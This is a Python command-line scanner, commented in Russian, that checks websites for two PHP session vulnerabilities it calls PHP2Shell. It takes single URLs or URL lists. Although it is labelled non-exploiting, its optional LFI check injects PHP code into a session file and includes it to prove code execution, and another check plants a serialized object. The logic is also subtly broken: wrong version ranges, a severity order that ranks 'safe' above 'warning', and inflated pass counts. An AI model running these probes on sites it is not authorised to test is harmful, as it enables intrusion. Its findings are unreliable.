#!/usr/bin/env python3
"""
Безопасная проверка сайтов на уязвимость CVE-2026-109618 / CVE-2026-109619 (PHP2Shell).

НЕ запускает эксплойт. Только косвенные проверки:
  1. PHP-Version-Header (CVE-2026-109619 — UAF var_destroy)
  2. CVE-2026-109618 — UAF/OOM через upload_progress (невалидный SID)
  3. upload_progress cookie (базовая проверка)
  4. Handler mismatch (опционально, --handler-write + --handler-read)
  5. Session injection + LFI (опционально, --lfi)

Результат: уязвимо / возможно уязвимо / не уязвимо / ошибка

Usage:
    python3 check_php2shell.py https://example.com
    python3 check_php2shell.py https://example.com --lfi "/vuln.php?page="
    python3 check_php2shell.py https://example.com --handler-write /upload.php --handler-read /api.php
    python3 check_php2shell.py --file urls.txt
"""

import sys
import re
import json
import random
import string
import urllib.request
import urllib.error
import urllib.parse
import ssl
import time
from datetime import datetime, timezone
from dataclasses import dataclass, asdict
from typing import Optional, List, Tuple


VULN_RANGES = [
    ("5.4.0",  "8.1.99", "8.2.35"),
    ("8.2.0",  "8.2.34", "8.2.35"),
    ("8.3.0",  "8.3.35", "8.3.36"),
    ("8.4.0",  "8.4.26", "8.4.27"),
    ("8.5.0",  "8.5.11", "8.5.12"),
]


def version_tuple(v: str) -> tuple:
    parts = v.strip().split(".")
    result = []
    for p in parts:
        try:
            result.append(int(p))
        except ValueError:
            result.append(0)
    while len(result) < 3:
        result.append(0)
    return tuple(result[:3])


def is_php_version_vulnerable(version_str: str) -> tuple:
    ver = version_str.strip()
    parts = ver.split(".")
    if len(parts) < 2:
        return False, "unknown", f"Не удалось распознать версию: {ver}"
    ver_tuple = version_tuple(ver)
    for min_v, max_v, patched_v in VULN_RANGES:
        if version_tuple(min_v) <= ver_tuple <= version_tuple(max_v):
            if ver_tuple >= version_tuple(patched_v):
                return False, "safe", f"PHP {ver} — патч {patched_v} уже применён"
            else:
                return True, "critical", f"PHP {ver} — уязвимо, нужен патч {patched_v}"
    if ver_tuple < version_tuple("5.4.0"):
        return False, "info", f"PHP {ver} — старая версия, вне зоны покрытия CVE"
    return False, "info", f"PHP {ver} — версия не входит в известные уязвимые диапазоны"


@dataclass
class CheckResult:
    url: str
    path: str
    php_version: Optional[str]
    vulnerable: bool
    severity: str
    details: list
    checks_passed: int
    checks_total: int
    vulnerabilities: list = None

    def to_dict(self):
        d = asdict(self)
        if self.vulnerabilities:
            d["vulnerabilities"] = [{"name": v[0], "severity": v[1], "detail": v[2]} for v in self.vulnerabilities]
        return d


def safe_request(url: str, method: str = "GET", headers: dict = None, timeout: int = 10) -> dict:
    result = {"status": None, "headers": {}, "body_length": 0, "cookies": [], "error": None, "php_version": None}
    if headers is None:
        headers = {}
    headers.setdefault("User-Agent", "Mozilla/5.0 (compatible; PHP2Shell-Checker/1.0)")
    ctx = ssl.create_default_context()
    req = urllib.request.Request(url, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        result["status"] = resp.status
        result["headers"] = dict(resp.headers)
        result["body_length"] = len(resp.read())
        php_ver = resp.headers.get("X-Powered-By", "")
        if "PHP/" in php_ver:
            result["php_version"] = php_ver.split("PHP/")[1].split(";")[0].strip()
        set_cookie = resp.headers.get("Set-Cookie", "")
        if set_cookie:
            result["cookies"] = [set_cookie]
        server_header = resp.headers.get("Server", "")
        if "PHP/" in server_header and not result["php_version"]:
            result["php_version"] = server_header.split("PHP/")[1].split(";")[0].strip()
    except urllib.error.HTTPError as e:
        result["status"] = e.code
        result["headers"] = dict(e.headers)
        result["error"] = f"HTTP {e.code}"
        try:
            result["body_length"] = len(e.read())
        except Exception:
            pass
        php_ver = e.headers.get("X-Powered-By", "")
        if "PHP/" in php_ver:
            result["php_version"] = php_ver.split("PHP/")[1].split(";")[0].strip()
        server_header = e.headers.get("Server", "")
        if "PHP/" in server_header and not result["php_version"]:
            result["php_version"] = server_header.split("PHP/")[1].split(";")[0].strip()
    except Exception as e:
        result["error"] = str(e)
    return result


def rand_base(n: int = 12) -> str:
    return "".join(random.choices(string.ascii_letters + string.digits, k=n))


def build_multipart_body(boundary: str, fields: list) -> bytes:
    lines = []
    for name, value, filename, ctype in fields:
        lines.append(f"------{boundary}".encode())
        if filename:
            lines.append(f'Content-Disposition: form-data; name="{name}"; filename="{filename}"'.encode())
            lines.append(f"Content-Type: {ctype}".encode())
        else:
            lines.append(f'Content-Disposition: form-data; name="{name}"'.encode())
        lines.append(b"")
        lines.append(value.encode() if isinstance(value, str) else value)
    lines.append(f"------{boundary}--".encode())
    return b"\r\n".join(lines)


def check_cve_109618_uaf(base_url: str, timeout: int = 10) -> tuple:
    """CVE-2026-109618 — UAF/OOM через upload_progress с невалидным SID."""
    marker = rand_base(12)
    sid_bad = f"nuclei/{rand_base(20)}"
    boundary = f"CVE109618{marker}"
    fields = [
        ("PHPSESSID", sid_bad, None, ""),
        ("PHP_SESSION_UPLOAD_PROGRESS", marker, None, ""),
        ("f", "Z", f"{marker}.txt", "text/plain"),
    ]
    body_bytes = build_multipart_body(boundary, fields)
    headers = {"Content-Type": f"multipart/form-data; boundary=----{boundary}", "Content-Length": str(len(body_bytes))}
    url = base_url.rstrip("/") + "/"
    ctx = ssl.create_default_context()
    req = urllib.request.Request(url, data=body_bytes, method="POST", headers=headers)
    req.add_header("User-Agent", "Mozilla/5.0 (compatible; PHP2Shell-Checker/1.0)")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            body = e.read().decode("utf-8", errors="replace")
        except Exception:
            body = ""
    except Exception as e:
        return False, "error", f"Ошибка запроса: {e}"

    indicator_a = "Session ID is too long or contains illegal characters" in body
    indicator_b = "Failed to read session data" in body or "PHP Request Startup" in body
    if indicator_a and indicator_b:
        return True, "critical", "CVE-2026-109618 подтверждён — upload_progress UAF/OOM. PHP вывел предупреждения о сессии. При cleanup=Off + LFI -> RCE."
    elif indicator_a:
        return False, "warning", "Частичное совпадение — предупреждение о SID сработало, но ошибка запуска не видна. display_errors может быть Off."
    else:
        return False, "info", "Индикаторы CVE-2026-109618 не найдены. (display_errors=Off может скрывать предупреждения.)"


def check_upload_progress_behavior(target_url: str, path: str) -> dict:
    boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
    body = (f"--{boundary}\r\n" f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' f"x\r\n" f"--{boundary}\r\n" f'Content-Disposition: form-data; name="file"; filename="test.txt"\r\n\r\n' f"test\r\n" f"--{boundary}--\r\n").encode("utf-8")
    headers = {"Content-Type": f"multipart/form-data; boundary={boundary}", "User-Agent": "Mozilla/5.0 (compatible; PHP2Shell-Checker/1.0)"}
    url = target_url.rstrip("/") + "/" + path.lstrip("/") if path else target_url
    ctx = ssl.create_default_context()
    req = urllib.request.Request(url, data=body, method="POST", headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        cookies = resp.headers.get("Set-Cookie", "")
        has_cookie = len(cookies) > 0
        php_ver = resp.headers.get("X-Powered-By", "")
        php_ver = php_ver.split("PHP/")[1].split(";")[0].strip() if "PHP/" in php_ver else None
    except urllib.error.HTTPError as e:
        cookies = e.headers.get("Set-Cookie", "")
        has_cookie = len(cookies) > 0
        php_ver = None
    except Exception:
        has_cookie = False
        php_ver = None
    result = {"has_session_cookie": has_cookie, "status": None, "php_version": php_ver}
    if has_cookie:
        result["detail"] = "Сервер создал сессию при POST с PHP_SESSION_UPLOAD_PROGRESS — upload_progress включён"
        result["vulnerable"] = True
    else:
        result["detail"] = "Сессия не создана — upload_progress может быть отключён"
        result["vulnerable"] = False
    return result


def check_handler_mismatch(base_url: str, write_path: str, read_path: str, timeout: int = 10) -> tuple:
    """php2shell handler mismatch — проверка десериализационной путаницы."""
    marker = rand_base(10)
    sid = f"nuclei{rand_base(24)}"
    boundary_w = f"Write{marker}"
    fields_w = [("PHPSESSID", sid, None, ""), ("PHP_SESSION_UPLOAD_PROGRESS", marker, None, ""), ("f", "Z", f'x|O:8:"stdClass":0:{{}}', "text/plain")]
    body_w = build_multipart_body(boundary_w, fields_w)
    hdrs_w = {"Content-Type": f"multipart/form-data; boundary=----{boundary_w}", "Content-Length": str(len(body_w))}
    write_url = base_url.rstrip("/") + write_path
    ctx = ssl.create_default_context()
    req_w = urllib.request.Request(write_url, data=body_w, method="POST", headers=hdrs_w)
    req_w.add_header("User-Agent", "Mozilla/5.0 (compatible; PHP2Shell-Checker/1.0)")
    try:
        resp_w = urllib.request.urlopen(req_w, timeout=timeout, context=ctx)
        body_w_resp = resp_w.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            body_w_resp = e.read().decode("utf-8", errors="replace")
        except Exception:
            body_w_resp = ""
    except Exception:
        return False, "error", "Ошибка write-запроса"

    boundary_r = f"Read{marker}"
    fields_r = [("PHPSESSID", sid, None, ""), ("PHP_SESSION_UPLOAD_PROGRESS", marker, None, ""), ("f", "Z", "dummy.txt", "text/plain")]
    body_r = build_multipart_body(boundary_r, fields_r)
    hdrs_r = {"Content-Type": f"multipart/form-data; boundary=----{boundary_r}", "Content-Length": str(len(body_r))}
    read_url = base_url.rstrip("/") + read_path
    req_r = urllib.request.Request(read_url, data=body_r, method="POST", headers=hdrs_r)
    req_r.add_header("User-Agent", "Mozilla/5.0 (compatible; PHP2Shell-Checker/1.0)")
    try:
        resp_r = urllib.request.urlopen(req_r, timeout=timeout, context=ctx)
        body_r_resp = resp_r.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            body_r_resp = e.read().decode("utf-8", errors="replace")
        except Exception:
            body_r_resp = ""
    except Exception:
        return False, "error", "Ошибка read-запроса"

    indicator_a = "Failed to decode session object" in body_r_resp
    indicator_b = "Session object destruction failed" in body_r_resp
    if indicator_a or indicator_b:
        return True, "critical", "Handler mismatch подтверждён — десериализационная путаница. Деструктор срабатывает при ошибке -> POP gadget может дать RCE."
    else:
        return False, "info", "Индикаторы handler mismatch не найдены. Требуется display_errors=On и endpoint'ы с разными serialize_handler."


def check_session_lfi(base_url: str, lfi_path: str, session_path: str = "/tmp/sessions/sess_", timeout: int = 10) -> tuple:
    """php2shell session injection + LFI chain."""
    marker = f"NUCLEI{rand_base(10)}"
    sid = f"nuclei{rand_base(24)}"
    upload_boundary = f"Upload{marker}"
    php_payload = f"<?php echo '{marker}'; ?>"
    fields = [("PHPSESSID", sid, None, ""), ("PHP_SESSION_UPLOAD_PROGRESS", marker, None, ""), ("f", "Z", php_payload, "text/plain")]
    body_bytes = build_multipart_body(upload_boundary, fields)
    hdrs = {"Content-Type": f"multipart/form-data; boundary=----{upload_boundary}", "Content-Length": str(len(body_bytes))}
    url = base_url.rstrip("/") + "/"
    ctx = ssl.create_default_context()
    req = urllib.request.Request(url, data=body_bytes, method="POST", headers=hdrs)
    req.add_header("User-Agent", "Mozilla/5.0 (compatible; PHP2Shell-Checker/1.0)")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        resp.read()
    except Exception:
        return False, "error", "Ошибка upload-запроса"

    session_file = f"{session_path}{sid}"
    lfi_url = base_url.rstrip("/") + lfi_path + urllib.parse.quote(session_file)
    req2 = urllib.request.Request(lfi_url)
    req2.add_header("User-Agent", "Mozilla/5.0 (compatible; PHP2Shell-Checker/1.0)")
    try:
        resp2 = urllib.request.urlopen(req2, timeout=timeout, context=ctx)
        body2 = resp2.read().decode("utf-8", errors="replace")
    except Exception:
        return False, "error", "Ошибка LFI-запроса"

    if marker in body2:
        return True, "critical", f"LFI подтверждён — маркер {marker} вернулся через включение сессии! PHP-код из сессии被执行: {php_payload}. Полный RCE достижим."
    else:
        return False, "info", "Маркер не найден в LFI-ответе. LFI-путь может быть неверным, cleanup=On, или use_strict_mode=On."


def analyze_target(url: str, path: str = "", lfi_path: str = "", handler_write: str = "", handler_read: str = "", timeout: int = 10) -> CheckResult:
    """Полный анализ одной цели."""
    details = []
    vulnerabilities: List[Tuple[str, str, str]] = []
    checks_count = 0
    checks_passed = 0
    php_version = None

    print(f"  [1/5] CVE-2026-109619: версия PHP (UAF var_destroy)...")
    resp = safe_request(url + path)
    if resp.get("error"):
        return CheckResult(url=url, path=path, php_version=None, vulnerable=False, severity="error", details=[f"Ошибка: {resp['error']}"], checks_passed=0, checks_total=5, vulnerabilities=[])

    php_version = resp.get("php_version")
    if php_version:
        vuln, sev, detail = is_php_version_vulnerable(php_version)
        if vuln:
            vulnerabilities.append(("CVE-2026-109619", sev, detail))
            details.append(f"🔴 {detail}")
        else:
            details.append(f"⚪ {detail}")
        checks_passed += 1
    else:
        details.append("⚪ Версия PHP не определена")
    checks_count += 1

    print(f"  [2/5] CVE-2026-109618: UAF/OOM upload_progress...")
    vuln, sev, detail = check_cve_109618_uaf(url + path, timeout)
    if vuln:
        vulnerabilities.append(("CVE-2026-109618", sev, detail))
        details.append(f"🔴 {detail}")
    elif sev == "warning":
        vulnerabilities.append(("CVE-2026-109618", sev, detail))
        details.append(f"🟡 {detail}")
    else:
        details.append(f"⚪ {detail}")
    checks_passed += 1
    checks_count += 1

    print(f"  [3/5] upload_progress: создание сессии...")
    upload_check = check_upload_progress_behavior(url, path)
    details.append(f"upload_progress: {'включён' if upload_check['has_session_cookie'] else 'не обнаружен'}")
    if upload_check.get("vulnerable"):
        details.append("🟡 upload_progress активен — потенциальная угроза")
    checks_passed += 1
    checks_count += 1

    print(f"  [4/5] Handler mismatch...")
    if handler_write and handler_read:
        vuln, sev, detail = check_handler_mismatch(url, handler_write, handler_read, timeout)
        if vuln:
            vulnerabilities.append(("Handler Mismatch", sev, detail))
            details.append(f"🔴 {detail}")
        else:
            details.append(f"⚪ {detail}")
    else:
        details.append("⚪ Пропущено (нужны --handler-write и --handler-read)")
    checks_passed += 1
    checks_count += 1

    print(f"  [5/5] Session injection + LFI...")
    if lfi_path:
        vuln, sev, detail = check_session_lfi(url, lfi_path, "/tmp/sessions/sess_", timeout)
        if vuln:
            vulnerabilities.append(("Session LFI", sev, detail))
            details.append(f"🔴 {detail}")
        else:
            details.append(f"⚪ {detail}")
    else:
        details.append("⚪ Пропущено (нужен --lfi)")
    checks_passed += 1
    checks_count += 1

    severity_order = {"info": 0, "warning": 1, "error": 2, "safe": 3, "critical": 4}
    max_severity = "safe"
    for name, sev, _ in vulnerabilities:
        if severity_order.get(sev, 0) > severity_order.get(max_severity, 0):
            max_severity = sev

    if max_severity == "critical":
        severity = "critical"
    elif max_severity == "warning":
        severity = "warning"
    else:
        severity = "safe"

    return CheckResult(url=url, path=path, php_version=php_version, vulnerable=max_severity == "critical", severity=severity, details=details, checks_passed=checks_passed, checks_total=checks_count, vulnerabilities=vulnerabilities)


def format_result(result: CheckResult) -> str:
    severity_colors = {"critical": "🔴", "warning": "🟡", "safe": "🟢", "info": "⚪", "error": "⚫"}
    severity_labels = {"critical": "КРИТИЧЕСКИ УЯЗВИМО", "warning": "ПОДОЗРИТЕЛЬНО", "safe": "НЕ УЯЗВИМО", "info": "Информация", "error": "Ошибка"}
    lines = []
    emoji = severity_colors.get(result.severity, "⚪")
    label = severity_labels.get(result.severity, result.severity)
    lines.append(f"\n{'='*70}")
    lines.append(f"  {emoji} {label}")
    lines.append(f"{'='*70}")
    lines.append(f"  URL:    {result.url}{result.path if result.path else ''}")
    lines.append(f"  PHP:    {result.php_version or 'Не определена'}")
    lines.append(f"  Checks: {result.checks_passed}/{result.checks_total}")
    lines.append(f"{'='*70}")
    for i, detail in enumerate(result.details, 1):
        lines.append(f"  [{i}] {detail}")
    if result.vulnerabilities:
        lines.append(f"{'='*70}")
        lines.append(f"  НАЙДЕННЫЕ УЯЗВИМОСТИ:")
        for name, sev, detail in result.vulnerabilities:
            lines.append(f"    🔴 {name}: {detail}")
        lines.append(f"{'='*70}")
    lines.append("")
    return "\n".join(lines)


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="Безопасная проверка сайтов на уязвимость CVE-2026-109618/109619 (PHP2Shell)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Примеры:
  python3 check_php2shell.py https://example.com
  python3 check_php2shell.py https://example.com --lfi "/vuln.php?page="
  python3 check_php2shell.py https://example.com --handler-write /upload.php --handler-read /api.php
  python3 check_php2shell.py --file urls.txt
  python3 check_php2shell.py https://example.com --json > results.json
        """
    )
    parser.add_argument("url", nargs="?", help="URL сайта для проверки")
    parser.add_argument("--path", default="", help="Путь к файлу (по умолчанию /)")
    parser.add_argument("--file", "-f", help="Файл с списком URL (по одному на строку)")
    parser.add_argument("--json", action="store_true", help="Вывод в JSON-формате")
    parser.add_argument("--timeout", type=int, default=10, help="Таймаут запроса (по умолчанию 10 сек)")
    parser.add_argument("--lfi", help="LFI-путь, например /vuln.php?page=")
    parser.add_argument("--handler-write", help="Endpoint для write (session.serialize_handler=php_serialize)")
    parser.add_argument("--handler-read", help="Endpoint для read (session.serialize_handler=php)")
    parser.add_argument("--concurrent", type=int, default=5, help="Максимум параллельных проверок")
    args = parser.parse_args()

    urls = []
    if args.url:
        urls.append(args.url)
    if args.file:
        try:
            with open(args.file, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        urls.append(line)
        except FileNotFoundError:
            print(f"Ошибка: файл {args.file} не найден")
            sys.exit(1)
    if not urls:
        parser.print_help()
        sys.exit(1)

    print(f"\n{'='*70}")
    print(f"  PHP2Shell Checker — CVE-2026-109618 / CVE-2026-109619")
    print(f"  Безопасная проверка (5 проверок, без эксплойта)")
    print(f"  {len(urls)} целей для проверки")
    print(f"  {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}")
    print(f"{'='*70}\n")

    results = []
    for i, url in enumerate(urls, 1):
        if not url.startswith("http"):
            url = "https://" + url
        print(f"[{i}/{len(urls)}] Проверяю {url}{args.path if args.path else ''}...")
        result = analyze_target(url, args.path, lfi_path=args.lfi, handler_write=args.handler_write, handler_read=args.handler_read, timeout=args.timeout)
        results.append(result)
        print(format_result(result))
        if i < len(urls):
            time.sleep(0.5)

    if args.json:
        output = {"scan_time": datetime.now(timezone.utc).isoformat(), "total": len(results), "vulnerable": sum(1 for r in results if r.severity == "critical"), "suspicious": sum(1 for r in results if r.severity == "warning"), "safe": sum(1 for r in results if r.severity == "safe"), "errors": sum(1 for r in results if r.severity == "error"), "results": [r.to_dict() for r in results]}
        print(json.dumps(output, indent=2, ensure_ascii=False))
    else:
        print(f"\n{'='*70}")
        print(f"  ИТОГОВАЯ СВОДКА")
        print(f"{'='*70}")
        print(f"  Всего проверок: {len(results)}")
        print(f"  🔴 Уязвимо:      {sum(1 for r in results if r.severity == 'critical')}")
        print(f"  🟡 Подозрительно: {sum(1 for r in results if r.severity == 'warning')}")
        print(f"  🟢 Не уязвимо:   {sum(1 for r in results if r.severity == 'safe')}")
        print(f"  ⚫ Ошибки:        {sum(1 for r in results if r.severity == 'error')}")
        print(f"{'='*70}\n")
        critical = [r for r in results if r.severity == "critical"]
        if critical:
            print("  ⚠️  РЕКОМЕНДАЦИИ:")
            print("  1. Немедленно обновите PHP до патчной версии:")
            print("     - PHP 8.2.x → 8.2.35+")
            print("     - PHP 8.3.x → 8.3.36+")
            print("     - PHP 8.4.x → 8.4.27+")
            print("     - PHP 8.5.x → 8.5.12+")
            print("  2. Или временно отключите upload_progress:")
            print("     session.upload_progress.enabled = Off")
            print("  3. Проверьте сервер на признаки компрометации:")
            print("     grep -r '<?php' /tmp/sessions/")
            print(f"{'='*70}\n")


if __name__ == "__main__":
    main()
